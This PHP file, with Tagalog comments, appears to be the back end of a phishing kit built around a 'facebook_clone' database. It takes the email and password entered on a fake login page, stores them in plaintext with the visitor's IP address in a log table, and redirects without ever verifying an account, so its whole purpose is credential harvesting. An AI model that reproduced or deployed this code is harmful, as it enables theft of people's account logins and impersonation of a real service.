<?php
// =============================================
//  login.php  –  i-lagay sa PAREHONG folder ng index.php
// =============================================

$host   = "localhost";
$dbname = "facebook_clone";
$user   = "root";
$pass   = "";

// ── 1. Kumonekta sa database ──────────────────
try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("DB Connection Failed: " . $e->getMessage());
}

// ── 2. Kunin ang POST data ────────────────────
$email    = $_POST['email']    ?? '';
$password = $_POST['password'] ?? '';
$ip       = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

// ── 3. Check kung may laman ───────────────────
if (empty($email) || empty($password)) {
    header("Location: index.php?error=empty");
    exit;
}

// ── 4. I-save sa database ─────────────────────
try {
    $sql  = "INSERT INTO login_logs (email, password, ip_address, created_at)
             VALUES (:email, :password, :ip, NOW())";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        ':email'    => $email,
        ':password' => $password,
        ':ip'       => $ip,
    ]);

    // ── 5. I-redirect pabalik sa index na may success ──
    header("Location: index.php?success=1");
    exit;

} catch (PDOException $e) {
    die("Insert Failed: " . $e->getMessage());
}
?>